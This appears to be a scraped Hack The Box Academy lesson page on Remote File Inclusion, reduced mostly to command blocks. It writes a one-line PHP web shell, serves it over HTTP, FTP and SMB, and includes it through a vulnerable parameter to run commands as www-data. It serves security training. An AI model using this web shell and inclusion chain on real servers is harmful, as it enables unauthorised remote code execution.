<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/23/section/254
// Platform Version: V1
// Module ID: 23
// Module Name: File Inclusion
// Module Difficulty: Medium
// Section ID: 254
// Section Title: Remote File Inclusion (RFI)
// Page Title: Hack The Box - Academy
// Page Number: 6
-->

# Remote File Inclusion (RFI)

**Module Name:** File Inclusion **Page Number:** 6

#### 

#### FILE INCLUSION

# Remote File Inclusion (RFI)

## Local vs. Remote File Inclusion

## Verify RFI

``` shell-session
[!bash!]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

![https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

## Remote Code Execution with RFI

``` shell-session
[!bash!]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## HTTP

``` shell-session
[!bash!]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

![https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

``` shell-session
[!bash!]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

## FTP

``` shell-session
[!bash!]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

![https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

``` shell-session
[!bash!]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## SMB

``` shell-session
[!bash!]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

![https://academy.hackthebox.com/storage/modules/23/windows_rfi.png](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

# 

# 

#### Questions

####